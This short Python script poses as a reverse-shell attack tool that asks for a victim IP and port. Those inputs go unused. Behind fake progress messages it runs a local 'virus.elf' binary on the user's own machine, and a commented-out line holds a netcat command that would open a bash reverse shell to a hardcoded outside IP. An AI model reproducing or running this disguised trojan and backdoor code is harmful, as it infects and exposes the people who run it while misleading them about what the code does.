import os
import subprocess
import time

# execute = ("nohup nc -e '/bin/bash' 52.15.194.28 11269 &")
print
print('Edit: Mohammed')
print
print('Loading')
print('')

print('Payload Default: linux/meterpreter/reverse_tcp')

time.sleep(17)

os.system('clear')

ip = raw_input('Ip Victim: ')
print('')
print('')
port = raw_input('Port: ')

# subprocess.call(execute, shell=True)

os.system('clear')

print('wait ')

time.sleep(9)

print('Bind Privileges, one second...')

time.sleep(32)

print('Connection Successul')

os.system('./../../virus.elf')

print()
print('Thanks You !!')









